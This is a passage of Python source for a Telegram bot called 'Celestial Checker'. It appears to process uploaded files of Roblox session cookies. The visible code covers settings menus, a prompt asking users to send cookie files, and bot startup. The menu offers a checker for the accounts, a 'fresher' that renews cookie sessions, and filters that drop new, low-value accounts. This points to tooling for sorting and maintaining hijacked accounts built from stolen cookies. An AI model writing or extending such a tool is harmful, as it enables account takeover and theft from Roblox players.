    
    save_user_settings()
    
    settings_text = (
        f"⚙️ <b>НАСТРОЙКИ CELESTIAL CHECKER</b>\n\n"
        f"<b>Текущие настройки:</b>\n"
        f"• 🗑️ Убрать нулевки: <b>{'Да' if settings['remove_new_accounts'] else 'Нет'}</b>\n"
        f"• 📅 Мин. возраст аккаунта: <b>{settings['min_account_age_days']} дней</b>\n"
        f"• 🧠 Точная проверка Brainrot: <b>{'Да' if settings['exact_brainrot_check'] else 'Нет'}</b>\n\n"
        f"<i>Выберите настройку для изменения:</i>"
    )
    
    await callback.message.edit_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=create_settings_keyboard(user_id)
    )

@dp.callback_query(F.data == "setting_change_age")
async def change_age_setting(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    await callback.message.edit_text(
        "📅 <b>Установите минимальный возраст аккаунта</b>\n\n"
        "Отправьте число дней (от 1 до 365):\n"
        "<i>Аккаунты младше этого возраста будут удалены из результатов</i>",
        parse_mode="HTML"
    )
    
    await state.set_state(Settings.waiting_for_min_days)

@dp.message(Settings.waiting_for_min_days)
async def process_min_days(message: Message, state: FSMContext):
    try:
        days = int(message.text)
        if 1 <= days <= 365:
            user_id = message.from_user.id
            settings = get_user_settings(user_id)
            settings['min_account_age_days'] = days
            
            save_user_settings()
            
            await message.answer(
                f"✅ <b>Минимальный возраст установлен:</b> {days} дней\n\n"
                f"Теперь при проверке будут удаляться аккаунты младше {days} дней.",
                parse_mode="HTML",
                reply_markup=create_settings_keyboard(user_id)
            )
            
            await state.clear()
        else:
            await message.answer(
                "❌ <b>Неверное значение!</b>\n"
                "Введите число от 1 до 365:",
                parse_mode="HTML"
            )
    except ValueError:
        await message.answer(
            "❌ <b>Неверный формат!</b>\n"
            "Введите число от 1 до 365:",
            parse_mode="HTML"
        )

@dp.callback_query(F.data == "settings_back")
async def settings_back(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    await callback.message.edit_text(
        "🌌 <b>Celestial Checker - Главное меню</b>\n\n"
        "Отправьте файл с куками для начала работы.",
        parse_mode="HTML"
    )
    
    await state.clear()

@dp.message()
async def other_message(message: Message):
    await message.answer(
        "📎 <b>Отправь мне текстовый файл (.txt) с куками Roblox</b>\n\n"
        "<i>Файл должен содержать куки в формате:</i>\n"
        "<code>_|WARNING:-DO-NOT-SHARE-THIS...</code>\n\n"
        "<i>После загрузки файла выбери действие:</i>\n"
        "• 🔍 <b>Чекер</b> - проверка аккаунтов\n"
        "• 🔄 <b>Фрешер</b> - обновление сессии куков\n"
        "• ⚙️ <b>Настройки</b> - настройки фильтрации",
        parse_mode="HTML"
    )

async def main():
    global session
    
    try:
        logger.info("🚀 Запуск Celestial Checker...")
        
        # Проверяем токен
        me = await bot.get_me()
        logger.info(f"✅ Бот авторизован: {me.full_name} (@{me.username})")
        logger.info(f"🔑 ID бота: {me.id}")
        
        # Запускаем веб-сервер
        web_runner = await start_web_server()
        logger.info("✅ Веб-сервер запущен")
        
        # Инициализируем сессию
        session = await get_session()
        
        # Очищаем вебхуки
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("🧹 Вебхуки очищены")
        
        # Запускаем поллинг
        logger.info("📡 Запускаю поллинг...")
        await dp.start_polling(bot)
        
    except Exception as e:
        logger.error(f"❌ Критическая ошибка: {e}")
        import traceback
        logger.error(f"Трассировка: {traceback.format_exc()}")
    finally:
        # Корректно закрываем сессии
        if session:
            await session.close()
            logger.info("🔒 HTTP сессия закрыта")
        logger.info("🏁 Бот завершил работу")

if __name__ == "__main__":
    # Проверяем токен
    if not TOKEN or len(TOKEN) < 10:
        logger.error("❌ Токен бота неверный или слишком короткий!")
    else:
        logger.info(f"🔑 Токен получен (длина: {len(TOKEN)} символов)")
        asyncio.run(main())
